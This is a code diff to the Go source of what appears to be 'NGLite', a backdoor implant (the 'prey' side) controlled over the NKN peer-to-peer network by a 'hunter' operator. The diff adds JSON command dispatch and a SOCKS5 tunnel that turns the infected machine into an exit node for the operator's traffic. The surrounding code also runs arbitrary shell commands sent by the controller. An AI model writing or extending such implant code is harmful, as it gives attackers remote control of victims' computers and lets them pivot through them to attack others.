@@ -3,11 +3,13 @@ package main
 import (
 	"crypto/md5"
 	"encoding/hex"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"strings"
 
 	"NGLite/conf"
+	"NGLite/internal/socks5"
 	"NGLite/module/cipher"
 	"NGLite/module/command"
 	"NGLite/module/fileops"
@@ -16,7 +18,12 @@ import (
 	nkn "github.com/nknorg/nkn-sdk-go"
 )
 
-var preyid string
+var (
+	preyid             string
+	socks5Server       *socks5.Server
+	socks5PreyListener *socks5.PreyListener
+	globalAccount      *nkn.Account
+)
 
 func main() {
 	var Seed string
@@ -99,6 +106,8 @@ func initonce(seedid string) {
 	if err != nil {
 		fmt.Println(err)
 	}
+	globalAccount = account // Save for SOCKS5 usage
+
 	replymsg, err := Sender(preyid, conf.Hunterid, account, RsaEncode([]byte(preyid)))
 	if err != nil {
 		fmt.Println(err)
@@ -151,6 +160,25 @@ func Sender(srcid string, dst string, acc *nkn.Account, msg interface{}) (string
 
 func Runcommand(cmd string) string {
 	if strings.HasPrefix(cmd, "{") && strings.Contains(cmd, "\"action\"") {
+		// Handle JSON commands
+		var jsonCmd map[string]interface{}
+		if err := json.Unmarshal([]byte(cmd), &jsonCmd); err != nil {
+			return fmt.Sprintf(`{"success":false,"error":"Invalid JSON: %s"}`, err.Error())
+		}
+
+		action, ok := jsonCmd["action"].(string)
+		if !ok {
+			return `{"success":false,"error":"Missing action field"}`
+		}
+
+		// Handle SOCKS5 commands
+		if action == "start_socks5" {
+			return handleStartSocks5(jsonCmd)
+		} else if action == "stop_socks5" {
+			return handleStopSocks5()
+		}
+
+		// Handle file commands
 		result, err := fileops.HandleFileCommand(cmd)
 		if err != nil {
 			return fmt.Sprintf(`{"success":false,"error":"%s"}`, err.Error())
@@ -160,4 +188,67 @@ func Runcommand(cmd string) string {
 
 	_, out, _ := command.NewCommand().Exec(cmd)
 	return out
+}
+
+func handleStartSocks5(jsonCmd map[string]interface{}) string {
+	fmt.Println("[SOCKS5] ========== Starting SOCKS5 Proxy (Prey Side) ==========")
+
+	// Stop existing if running
+	if socks5Server != nil {
+		fmt.Println("[SOCKS5] Stopping existing SOCKS5 server...")
+		socks5Server.Close()
+		socks5Server = nil
+	}
+	if socks5PreyListener != nil {
+		fmt.Println("[SOCKS5] Stopping existing NKN listener...")
+		socks5PreyListener.Close()
+		socks5PreyListener = nil
+	}
+
+	// Create NKN identifier for SOCKS5 tunnel
+	identifier := fmt.Sprintf("%s_socks5", preyid)
+	fmt.Printf("[SOCKS5] Creating NKN listener with identifier: %s\n", identifier)
+	fmt.Printf("[SOCKS5] Prey ID: %s\n", preyid)
+	fmt.Println("[SOCKS5] This prey will act as the EXIT node - connecting to real targets")
+
+	// Start prey-side NKN listener (NO local SOCKS5 server needed!)
+	listener, err := socks5.NewPreyListener(globalAccount, identifier, conf.TransThreads)
+	if err != nil {
+		fmt.Printf("[SOCKS5] ERROR: Failed to create NKN listener: %v\n", err)
+		return fmt.Sprintf(`{"success":false,"error":"Failed to start NKN listener: %s"}`, err.Error())
+	}
+	socks5PreyListener = listener
+	fmt.Printf("[SOCKS5] ✓ NKN listener created\n")
+	fmt.Printf("[SOCKS5] NKN address: %s\n", listener.Addr())
+
+	// Start listener in background
+	go func() {
+		fmt.Println("[SOCKS5] Starting NKN listener loop...")
+		if err := listener.Start(); err != nil {
+			fmt.Printf("[SOCKS5] NKN listener error: %v\n", err)
+		}
+	}()
+
+	fmt.Println("[SOCKS5] ========== SOCKS5 Proxy Started ==========")
+	fmt.Printf("[SOCKS5] Role: EXIT NODE (will connect to real internet targets)\n")
+	fmt.Printf("[SOCKS5] NKN identifier: %s\n", identifier)
+	fmt.Printf("[SOCKS5] NKN full address: %s\n", listener.Addr())
+	fmt.Println("[SOCKS5] ===============================================")
+
+	return fmt.Sprintf(`{"success":true,"nkn_addr":"%s","identifier":"%s"}`,
+		listener.Addr(), identifier)
+}
+
+func handleStopSocks5() string {
+	if socks5Server != nil {
+		socks5Server.Close()
+		socks5Server = nil
+	}
+	if socks5PreyListener != nil {
+		socks5PreyListener.Close()
+		socks5PreyListener = nil
+	}
+
+	fmt.Println("[SOCKS5] Stopped")
+	return `{"success":true,"message":"SOCKS5 stopped"}`
 }
